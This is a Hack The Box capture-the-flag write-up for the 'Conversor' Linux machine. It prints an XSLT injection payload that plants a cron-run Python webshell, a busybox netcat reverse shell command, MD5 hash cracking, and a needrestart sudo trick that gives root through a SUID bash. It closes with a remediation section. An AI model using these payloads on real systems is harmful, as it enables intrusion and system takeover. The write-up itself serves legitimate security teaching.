# Conversor — Hack The Box

![Conversor](../images/Conversor.png)

**Machine:** Conversor  
**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.10.11.92  
**Date:** 2025-10-31  
**Tags:** XSLT Injection, File Upload, Cron Jobs, Privilege Escalation, Weak Password Hashing

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Source Code Discovery](#source-code-discovery)
4. [Exploitation](#exploitation)
5. [Lateral Movement](#lateral-movement)
6. [Privilege Escalation](#privilege-escalation)
7. [Summary of Exploits](#summary-of-exploits)
8. [Remediation](#remediation)
9. [Tools](#tools)

---

## Summary

Conversor is an Easy Linux box that exploits an XSLT injection vulnerability in a file conversion web application. The attack chain involves discovering source code disclosure, exploiting XSLT injection to write a Python webshell to a cron-executed directory, achieving remote code execution, extracting weak MD5 password hashes from a SQLite database, and escalating privileges via a sudo misconfiguration with `needrestart`.

**Attack Path:**  
Web enumeration → Source code disclosure → XSLT injection → Cron-executed webshell → RCE → Credential extraction → SSH access → Sudo exploitation → Root

---

## Reconnaissance

### Port Scanning

Comprehensive nmap scan to identify open services:

```bash
nmap -sC -sV -p- --min-rate=5000 -T5 10.10.11.92 -oN nmap_scan.txt
```

**Results:**

```
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache 2.4.52
```

**Key Findings:**
- Hostname: `conversor.htb`
- Web application on port 80 with a login form
- Apache web server version 2.4.52

### Hostname Configuration

```bash
echo "10.10.11.92 conversor.htb" | sudo tee -a /etc/hosts
```

---

## Source Code Discovery

### Application Source Code

Navigating to `/about` revealed a downloadable `source.tar` archive containing the complete application source code.

**Extracted Structure:**

```
app/
├── app.py              # Main Flask application
├── instance/
│   └── users.db       # SQLite database with user credentials
├── scripts/            # Directory executed by cron
└── install.md          # Installation documentation with paths and cron info
```

### Critical Discovery: Cron Job

The `install.md` file revealed a cron job configuration:

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

**Analysis:**
- Cron job runs every minute
- Executes all Python files in `/var/www/conversor.htb/scripts/`
- Runs as `www-data` user
- If we can write files to this directory, they will be executed automatically

---

## Exploitation

### XSLT Injection Vulnerability

The application processes XML files using XSLT transformations. The XSLT processor allowed EXSLT (Extended Stylesheet Language) extensions, which enabled arbitrary file writes to the filesystem.

#### Exploit Strategy

1. Craft an XSLT payload using `exsl:document` to write a Python webshell
2. Write the shell to `/var/www/conversor.htb/scripts/` (cron-executed directory)
3. Wait for cron execution (~1 minute)
4. Interact with the webshell via HTTP requests

#### Webshell Payload

Created `webshell.xslt` that writes `shell.py` to the cron directory:

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:exsl="http://exslt.org/common"
extension-element-prefixes="exsl" version="1.0">
<xsl:template match="/">
<exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text"><![CDATA[
#!/usr/bin/env python3
import os, subprocess, traceback
CMD="/var/www/conversor.htb/static/cmd.txt"
OUT="/var/www/conversor.htb/static/out.txt"
try:
    if os.path.exists(CMD):
        cmd=open(CMD).read().strip()
        if cmd:
            out=subprocess.getoutput(cmd)
            open(OUT,"w").write(out)
            open(CMD,"w").close()
except Exception as e:
    open(OUT,"w").write(str(e))
]]></exsl:document>
</xsl:template></xsl:stylesheet>
```

**How it works:**
- Reads commands from `/var/www/conversor.htb/static/cmd.txt`
- Executes the command via `subprocess.getoutput()`
- Writes output to `/var/www/conversor.htb/static/out.txt`

#### Deployment

1. Upload both XML and XSLT files through the web interface
2. Wait for cron job execution (~1 minute)
3. The webshell is now active and listening for commands

### Remote Code Execution Verification

#### Test Command Execution

Write a test command using another XSLT injection:

```xml
<exsl:document href="/var/www/conversor.htb/static/cmd.txt" method="text"><![CDATA[id]]></exsl:document>
```

Check the output:

```bash
curl http://conversor.htb/static/out.txt
```

**Result:**

```
uid=33(www-data) gid=33(www-data)
```

✅ **RCE confirmed as `www-data` user**

### Reverse Shell

#### Establish Reverse Shell Connection

Write reverse shell command via XSLT:

```xml
<exsl:document href="/var/www/conversor.htb/static/cmd.txt" method="text"><![CDATA[busybox nc 10.10.14.114 443 -e bash]]></exsl:document>
```

Start netcat listener:

```bash
nc -lvnp 443
```

**Result:**  
Received reverse shell connection as `www-data` user

#### Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Lateral Movement

### Database Credential Extraction

Located the SQLite database in the application directory:

```bash
strings /var/www/conversor.htb/instance/users.db
```

**Discovered Credentials:**

```
fismathack:5b5c3ac3a1c897c94caad48e6c71fdec
```

**Analysis:**
- Username: `fismathack`
- Hash: `5b5c3ac3a1c897c94caad48e6c71fdec` (appears to be MD5)

### Password Cracking

Cracked the MD5 hash using hashcat:

```bash
echo "5b5c3ac3a1c897c94caad48e6c71fdec" > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `Keepmesafeandwarm`

### SSH Access

Authenticated via SSH using discovered credentials:

```bash
ssh fismathack@10.10.11.92
# Password: Keepmesafeandwarm
```

**User Flag:**

```bash
cat user.txt
# HTB{redacted}
```

✅ **User flag captured**

---

## Privilege Escalation

### Sudo Enumeration

Checked sudo privileges:

```bash
sudo -l
```

**Output:**

```
User fismathack may run the following commands on conversor:
    (root) NOPASSWD: /usr/sbin/needrestart
```

🚨 **Critical Finding:** User can run `needrestart` as root without password

### needrestart Sudo Exploitation

The `needrestart` utility can execute custom configuration scripts. By creating a malicious configuration file, we can execute commands as root.

#### Exploitation Steps

1. Create malicious configuration file:

```bash
echo 'system("chmod +s /bin/bash");' > root.sh
```

2. Execute needrestart with custom config:

```bash
sudo /usr/sbin/needrestart -c root.sh
```

3. Verify SUID bit on bash:

```bash
ls -la /bin/bash
```

**Output:**

```
-rwsr-xr-x 1 root root 1396520 ... /bin/bash
    ^
    └─ SUID bit set!
```

#### Root Shell Access

Execute bash with preserved privileges:

```bash
/bin/bash -p
```

**Verification:**

```bash
id
# uid=1000(fismathack) gid=1000(fismathack) euid=0(root) groups=1000(fismathack)
```

✅ **Effective UID = 0 (root)**

### Root Flag

```bash
cat /root/root.txt
# HTB{redacted}
```

✅ **Root flag captured**

---

## Summary of Exploits

| Stage | Vulnerability | Technique | Result |
|-------|---------------|-----------|--------|
| 1 | Source Code Disclosure | `/about` endpoint | Application source code |
| 2 | XSLT Injection | EXSLT `exsl:document` | File write to cron directory |
| 3 | Cron Job Execution | Python webshell | Remote code execution |
| 4 | Weak Password Hashing | MD5 hash in SQLite | Credential extraction |
| 5 | Sudo Misconfiguration | `needrestart` custom config | Root privilege escalation |

---

## Remediation

### Critical Security Issues

1. **XSLT Injection (EXSLT File Write)**
   - Disable EXSLT extensions if not required
   - Restrict file write operations to specific allowed directories
   - Implement input validation and sanitization
   - Use allowlists for file paths instead of blocking specific paths
   - Implement strict file permission controls

2. **Weak Password Hashing (MD5)**
   - **Immediate:** Migrate to strong hashing algorithms (bcrypt, Argon2, scrypt)
   - Add salt to all password hashes
   - Never use MD5, SHA1, or other fast hashing algorithms for passwords
   - Implement password complexity requirements
   - Use libraries designed for password hashing (e.g., `passlib` for Python)

3. **Source Code Disclosure**
   - Remove or secure the `/about` endpoint
   - Do not include source code archives in production deployments
   - Use code obfuscation if source must be distributed
   - Implement proper access controls

4. **Cron Job Security**
   - Remove unnecessary cron tasks
   - Restrict file permissions on cron-executed directories
   - Use separate user accounts with minimal privileges for cron jobs
   - Implement file integrity monitoring
   - Audit all cron-executed scripts regularly

5. **Sudo Misconfiguration**
   - Review and audit all sudo rules
   - Avoid granting NOPASSWD to users unnecessarily
   - Restrict command parameters (use `NOEXEC` where applicable)
   - Remove or restrict access to utilities that accept custom configs (`needrestart`)
   - Follow principle of least privilege

### Security Best Practices

- Regular security code reviews and penetration testing
- Implement Web Application Firewall (WAF) rules
- Use secure development lifecycle (SDL) practices
- Regular dependency scanning and updates
- Implement comprehensive logging and monitoring
- Network segmentation to limit lateral movement

---

## Tools

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `curl` | HTTP requests and webshell interaction |
| `sqlite3` | Database querying and enumeration |
| `strings` | Binary/hexdump file analysis |
| `hashcat` | Password hash cracking |
| `netcat` | Reverse shell listener |
| `ssh` | Remote access |

---

**Author:** Erviano Florentino Susanto  
**Platform:** Hack The Box  
**Date:** 2025-10-31  
**Flags:** User `HTB{redacted}`, Root `HTB{redacted}`

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities.*
